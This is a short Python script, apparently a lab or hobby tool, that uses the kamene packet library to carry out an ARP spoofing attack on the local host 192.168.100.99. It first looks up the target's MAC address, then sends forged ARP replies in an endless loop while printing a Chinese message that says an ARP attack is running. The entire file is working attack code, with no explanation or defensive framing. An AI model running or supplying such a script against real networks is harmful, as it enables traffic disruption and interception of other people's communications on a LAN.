from kamene.all import *
from Tools.get_ip_netifaces_exe import get_ip_address
from Tools.get_mac_netifaces_exe import get_mac_address
from Tools.get_ifname import get_ifname
import time

local_ip = get_ip_address('ens33')
local_mac = get_mac_address('ens33')
print('本机IP地址：',local_ip)
print('本机MAC地址：',local_mac)
get_route_mac_raw = sr1(ARP(pdst='192.168.100.99'),verbose=False)
get_route_mac = get_route_mac_raw.getlayer(ARP).fields.get('hwsrc')
print(get_route_mac)

while True:
    try:
        sendp(Ether(src=local_mac,dst=get_route_mac)/ARP(op=2,
                                                         psrc='192.168.100.99',
                                                         hwsrc=local_mac,
                                                         pdst='192.168.100.99',
                                                         hwdst=get_route_mac),iface=get_ifname('ens33'),verbose=False)
        print(f'正在ARP攻击')
        time.sleep(1)
    except KeyboardInterrupt:
        sendp(Ether(src=local_mac,dst=get_route_mac)/ARP(op=2,
                                                         psrc=local_ip,
                                                         hwsrc=local_mac,
                                                         pdst='192.168.100.99',
                                                         hwdst=get_route_mac),iface=get_ifname('ens33'),verbose=False)
        break

